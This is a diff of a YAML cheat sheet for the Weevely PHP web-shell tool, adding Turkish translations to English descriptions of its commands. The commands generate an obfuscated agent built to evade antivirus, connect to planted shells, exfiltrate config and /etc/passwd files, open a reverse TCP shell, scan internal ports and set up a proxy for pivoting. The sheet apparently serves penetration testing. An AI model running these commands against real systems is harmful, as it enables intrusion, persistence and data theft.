@@ -3,104 +3,202 @@ tags: [web, webshell, post-exploitation, pentest, backdoor, php, security, enume
 
 actions:
   # === GENERATION AND CONNECTION ===
-  - title: weevely - generate php agent
-    desc: |
-      Generates a new polymorphic PHP agent with a custom password. 
-      The generated script is designed to be obfuscated to bypass signature-based antivirus and WAF detection. 
-      The password provided here will be required every time you want to connect to this specific shell.
+  - title:
+      en: weevely - generate php agent
+      tr: weevely - php aracısı üretme
+    desc:
+      en: |
+        Generates a new polymorphic PHP agent with a custom password. 
+        The generated script is designed to be obfuscated to bypass signature-based antivirus and WAF detection. 
+        The password provided here will be required every time you want to connect to this specific shell.
+      tr: |
+        Özel bir parolayla yeni polimorfik bir PHP aracısı üretir.
+        Üretilen betik, imza tabanlı antivirüs ve WAF tespitini atlatmak için gizlenecek şekilde tasarlanmıştır.
+        Burada verilen parola, bu kabuğa her bağlanmak istediğinizde gerekli olacaktır.
     command: "weevely generate {{password}} {{path|shell.php}}"
 
-  - title: weevely - connect to agent
-    desc: |
-      Establishes an interactive session with a previously uploaded Weevely agent. 
-      You must provide the full URL where the agent is hosted and the password used during generation. 
-      Once connected, you enter a specialized shell environment that supports both system commands and internal modules.
+  - title:
+      en: weevely - connect to agent
+      tr: weevely - aracıya bağlanma
+    desc:
+      en: |
+        Establishes an interactive session with a previously uploaded Weevely agent. 
+        You must provide the full URL where the agent is hosted and the password used during generation. 
+        Once connected, you enter a specialized shell environment that supports both system commands and internal modules.
+      tr: |
+        Önceden yüklenmiş bir Weevely aracısıyla etkileşimli bir oturum kurar.
+        Aracının barındırıldığı tam URL'yi ve üretim sırasında kullanılan parolayı vermelisiniz.
+        Bağlandıktan sonra hem sistem komutlarını hem de dahili modülleri destekleyen özel bir kabuk ortamına girersiniz.
     command: "weevely {{url}} {{password}}"
 
-  - title: weevely - execute single command
-    desc: |
-      Executes a single system command or Weevely module on the target without opening an interactive session. 
-      This is highly useful for automation, scripting, or quick checks of the target environment. 
-      The session terminates immediately after the command output is returned to the local terminal.
+  - title:
+      en: weevely - execute single command
+      tr: weevely - tek komut çalıştırma
+    desc:
+      en: |
+        Executes a single system command or Weevely module on the target without opening an interactive session. 
+        This is highly useful for automation, scripting, or quick checks of the target environment. 
+        The session terminates immediately after the command output is returned to the local terminal.
+      tr: |
+        Etkileşimli oturum açmadan hedefte tek bir sistem komutu veya Weevely modülü çalıştırır.
+        Bu, otomasyon, betikler veya hedef ortamın hızlı kontrolleri için oldukça kullanışlıdır.
+        Oturum, komut çıktısı yerel terminale döndükten hemen sonra sona erer.
     command: "weevely {{url}} {{password}} \"{{command|whoami}}\""
 
   # === FILE OPERATIONS ===
-  - title: weevely - list directory contents
-    desc: |
-      Lists files and directories in a specific path on the target server. 
-      It provides detailed information including permissions, owner, group, and modification time. 
-      This module is essential for navigating the remote filesystem and identifying sensitive configuration files.
+  - title:
+      en: weevely - list directory contents
+      tr: weevely - dizin içeriğini listeleme
+    desc:
+      en: |
+        Lists files and directories in a specific path on the target server. 
+        It provides detailed information including permissions, owner, group, and modification time. 
+        This module is essential for navigating the remote filesystem and identifying sensitive configuration files.
+      tr: |
+        Hedef sunucudaki belirli bir yoldaki dosya ve dizinleri listeler.
+        İzinler, sahip, grup ve değişiklik zamanı dahil ayrıntılı bilgi verir.
+        Bu modül, uzak dosya sisteminde gezinmek ve hassas yapılandırma dosyalarını belirlemek için gereklidir.
     command: "weevely {{url}} {{password}} :file_ls {{directory|/var/www/html}}"
 
-  - title: weevely - upload local file
-    desc: |
-      Uploads a file from your local machine to the remote target's filesystem. 
-      This is a critical operation for transferring additional exploitation tools, scripts, or lateral movement binaries. 
-      Ensure that the web server user has sufficient write permissions in the destination directory.
+  - title:
+      en: weevely - upload local file
+      tr: weevely - yerel dosya yükleme
+    desc:
+      en: |
+        Uploads a file from your local machine to the remote target's filesystem. 
+        This is a critical operation for transferring additional exploitation tools, scripts, or lateral movement binaries. 
+        Ensure that the web server user has sufficient write permissions in the destination directory.
+      tr: |
+        Yerel makinenizden uzak hedefin dosya sistemine dosya yükler.
+        Bu, ek sömürü araçları, betikler veya yanal hareket ikilileri aktarmak için kritik bir işlemdir.
+        Web sunucusu kullanıcısının hedef dizinde yeterli yazma izni olduğundan emin olun.
     command: "weevely {{url}} {{password}} :file_upload {{local_path}} {{remote_path}}"
 
-  - title: weevely - download remote file
-    desc: |
-      Downloads a file from the target server to your local machine. 
-      Commonly used for exfiltrating database configuration files, source code, or sensitive system files like /etc/passwd. 
-      Be cautious when downloading very large files as it may trigger network-based detection or timeout the request.
+  - title:
+      en: weevely - download remote file
+      tr: weevely - uzak dosya indirme
+    desc:
+      en: |
+        Downloads a file from the target server to your local machine. 
+        Commonly used for exfiltrating database configuration files, source code, or sensitive system files like /etc/passwd. 
+        Be cautious when downloading very large files as it may trigger network-based detection or timeout the request.
+      tr: |
+        Hedef sunucudan yerel makinenize dosya indirir.
+        Genellikle veritabanı yapılandırma dosyaları, kaynak kodu veya /etc/passwd gibi hassas sistem dosyalarını sızdırmak için kullanılır.
+        Ağ tabanlı tespiti tetikleyebileceği veya isteği zaman aşımına uğratabileceği için çok büyük dosyaları indirirken dikkatli olun.
     command: "weevely {{url}} {{password}} :file_download {{remote_path}} {{local_path}}"
 
-  - title: weevely - find files by name
-    desc: |
-      Searches for files on the target filesystem based on name patterns or attributes. 
-      This is useful for locating specific configuration files (e.g., config.php, .env) or sensitive backups across the entire drive. 
-      The module helps in targeted data discovery without manually browsing every directory.
+  - title:
+      en: weevely - find files by name
+      tr: weevely - ada göre dosya bulma
+    desc:
+      en: |
+        Searches for files on the target filesystem based on name patterns or attributes. 
+        This is useful for locating specific configuration files (e.g., config.php, .env) or sensitive backups across the entire drive. 
+        The module helps in targeted data discovery without manually browsing every directory.
+      tr: |
+        Hedef dosya sisteminde ad kalıplarına veya özniteliklere göre dosya arar.
+        Bu, belirli yapılandırma dosyalarını (örn. config.php, .env) veya sürücü genelindeki hassas yedekleri bulmak için kullanışlıdır.
+        Modül, her dizini elle gezmeden hedefli veri keşfine yardımcı olur.
     command: "weevely {{url}} {{password}} :file_find {{path|/var/www}} {{name|config.php}}"
 
   # === SYSTEM AUDIT AND ENUMERATION ===
-  - title: weevely - gather system information
-    desc: |
-      Collects comprehensive information about the target operating system, kernel version, and hardware architecture. 
-      This data is vital for selecting appropriate local privilege escalation exploits or understanding the OS environment. 
-      It also checks for available system binaries like python, perl, or gcc that can be used for further exploitation.
+  - title:
+      en: weevely - gather system information
+      tr: weevely - sistem bilgisi toplama
+    desc:
+      en: |
+        Collects comprehensive information about the target operating system, kernel version, and hardware architecture. 
+        This data is vital for selecting appropriate local privilege escalation exploits or understanding the OS environment. 
+        It also checks for available system binaries like python, perl, or gcc that can be used for further exploitation.
+      tr: |
+        Hedef işletim sistemi, çekirdek sürümü ve donanım mimarisi hakkında kapsamlı bilgi toplar.
+        Bu veri, uygun yerel ayrıcalık yükseltme istismarlarını seçmek veya işletim sistemi ortamını anlamak için hayati önem taşır.
+        Ayrıca daha fazla sömürüde kullanılabilecek python, perl veya gcc gibi mevcut sistem ikililerini denetler.
     command: "weevely {{url}} {{password}} :system_info"
 
-  - title: weevely - audit filesystem permissions
-    desc: |
-      Audits the remote filesystem to find directories with weak or insecure permissions. 
-      It identifies world-writable folders or sensitive files that are readable by the web server user. 
-      This information is crucial for finding locations to hide backdoors or identifying misconfigurations.
+  - title:
+      en: weevely - audit filesystem permissions
+      tr: weevely - dosya sistemi izinlerini denetleme
+    desc:
+      en: |
+        Audits the remote filesystem to find directories with weak or insecure permissions. 
+        It identifies world-writable folders or sensitive files that are readable by the web server user. 
+        This information is crucial for finding locations to hide backdoors or identifying misconfigurations.
+      tr: |
+        Uzak dosya sistemini zayıf veya güvensiz izinli dizinler için denetler.
+        Web sunucusu kullanıcısı tarafından okunabilen, herkese yazılabilir klasörleri veya hassas dosyaları tespit eder.
+        Bu bilgi, arka kapıları gizlenecek yerler bulmak veya yanlış yapılandırmaları tespit etmek için kritiktir.
     command: "weevely {{url}} {{password}} :audit_filesystem"
 
-  - title: weevely - read /etc/passwd
-    desc: |
-      Attempts to read the /etc/passwd file using various techniques to bypass potential restrictions. 
-      This file provides a list of system users, which is essential for password spraying or identifying high-privilege accounts. 
-      The module tries different methods in case standard file reading is blocked by security configurations.
+  - title:
+      en: weevely - read /etc/passwd
+      tr: weevely - /etc/passwd okuma
+    desc:
+      en: |
+        Attempts to read the /etc/passwd file using various techniques to bypass potential restrictions. 
+        This file provides a list of system users, which is essential for password spraying or identifying high-privilege accounts. 
+        The module tries different methods in case standard file reading is blocked by security configurations.
+      tr: |
+        Olası kısıtlamaları aşmak için çeşitli tekniklerle /etc/passwd dosyasını okumaya çalışır.
+        Bu dosya sistem kullanıcılarının listesini verir; bu, parola püskürtme veya yüksek ayrıcalıklı hesapları belirleme için gereklidir.
+        Modül, standart dosya okuma güvenlik yapılandırmalarınca engellenirse farklı yöntemler dener.
     command: "weevely {{url}} {{password}} :audit_etcpasswd"
 
   # === NETWORKING AND PIVOTING ===
-  - title: weevely - spawn reverse tcp shell
-    desc: |
-      Initiates a reverse TCP shell connection from the target back to your listener. 
-      This provides a more stable and fully interactive terminal compared to the request-response nature of a web shell. 
-      Make sure to have a listener like Netcat or Metasploit running on the specified IP and port before executing this command.
+  - title:
+      en: weevely - spawn reverse tcp shell
+      tr: weevely - ters tcp kabuğu başlatma
+    desc:
+      en: |
+        Initiates a reverse TCP shell connection from the target back to your listener. 
+        This provides a more stable and fully interactive terminal compared to the request-response nature of a web shell. 
+        Make sure to have a listener like Netcat or Metasploit running on the specified IP and port before executing this command.
+      tr: |
+        Hedeften dinleyicinize ters bir TCP kabuk bağlantısı başlatır.
+        Bu, web kabuğunun istek-yanıt doğasından daha kararlı ve tam etkileşimli bir terminal sağlar.
+        Bu komutu çalıştırmadan önce belirtilen IP ve portta Netcat veya Metasploit gibi bir dinleyicinin çalıştığından emin olun.
     command: "weevely {{url}} {{password}} :backdoor_reversetcp {{ip}} {{port}}"
 
-  - title: weevely - internal port scan
-    desc: |
-      Performs a TCP port scan on the internal network or the localhost from the perspective of the target server. 
-      This allows you to discover internal services that are not exposed to the public internet, such as databases or management interfaces. 
-      It is a key step for pivoting and moving laterally within the target's internal infrastructure.
+  - title:
+      en: weevely - internal port scan
+      tr: weevely - dahili port taraması
+    desc:
+      en: |
+        Performs a TCP port scan on the internal network or the localhost from the perspective of the target server. 
+        This allows you to discover internal services that are not exposed to the public internet, such as databases or management interfaces. 
+        It is a key step for pivoting and moving laterally within the target's internal infrastructure.
+      tr: |
+        Hedef sunucunun bakış açısından dahili ağda veya localhost üzerinde bir TCP port taraması gerçekleştirir.
+        Bu, internete açık olmayan veritabanları veya yönetim arayüzleri gibi dahili servisleri keşfetmenizi sağlar.
+        Hedefin dahili altyapısında pivot ve yanal hareket için kilit bir adımdır.
     command: "weevely {{url}} {{password}} :net_scan {{target_ip|127.0.0.1}} {{ports|21,22,80,443,3306,5432}}"
 
-  - title: weevely - install php proxy
-    desc: |
-      Installs a PHP-based proxy on the target server to tunnel traffic through it. 
-      This allows you to browse internal web applications or bypass firewalls by using the compromised server as a gateway. 
-      This module is particularly effective for accessing internal-only admin panels or development environments.
+  - title:
+      en: weevely - install php proxy
+      tr: weevely - php proxy kurma
+    desc:
+      en: |
+        Installs a PHP-based proxy on the target server to tunnel traffic through it. 
+        This allows you to browse internal web applications or bypass firewalls by using the compromised server as a gateway. 
+        This module is particularly effective for accessing internal-only admin panels or development environments.
+      tr: |
+        Trafiği üzerinden tünellemek için hedef sunucuya PHP tabanlı bir proxy kurar.
+        Bu, ele geçirilen sunucuyu ağ geçidi olarak kullanarak dahili web uygulamalarına göz atmanıza veya güvenlik duvarlarını aşmanıza olanak tanır.
+        Bu modül, yalnızca dahili admin panellerine veya geliştirme ortamlarına erişimde özellikle etkilidir.
     command: "weevely {{url}} {{password}} :net_phpproxy"
 
   # === DATABASE OPERATIONS ===
-  - title: weevely - interactive sql console
-    desc: |
-      Provides an interactive SQL console to execute queries directly against a database reachable by the target. 
-      It supports multiple DBMS types and requires valid credentials to establish the connection. 
-      This is much faster than manual exploitation for extracting data or modifying database records once credentials are found.
+  - title:
+      en: weevely - interactive sql console
+      tr: weevely - etkileşimli sql konsolu
+    desc:
+      en: |
+        Provides an interactive SQL console to execute queries directly against a database reachable by the target. 
+        It supports multiple DBMS types and requires valid credentials to establish the connection. 
+        This is much faster than manual exploitation for extracting data or modifying database records once credentials are found.
+      tr: |
+        Hedefin erişebildiği bir veritabanına karşı doğrudan sorgu çalıştırmak için etkileşimli bir SQL konsolu sağlar.
+        Bağlantıyı kurmak için birden fazla VTYS türünü destekler ve geçerli kimlik bilgileri gerektirir.
+        Kimlik bilgileri bulunduktan sonra veri çıkarmak veya veritabanı kayıtlarını değiştirmek için manuel sömürüden çok daha hızlıdır.
     command: "weevely {{url}} {{password}} :sql_console --user {{db_user}} --pass {{db_pass}} --host {{db_host|localhost}} --db {{db_name}}"
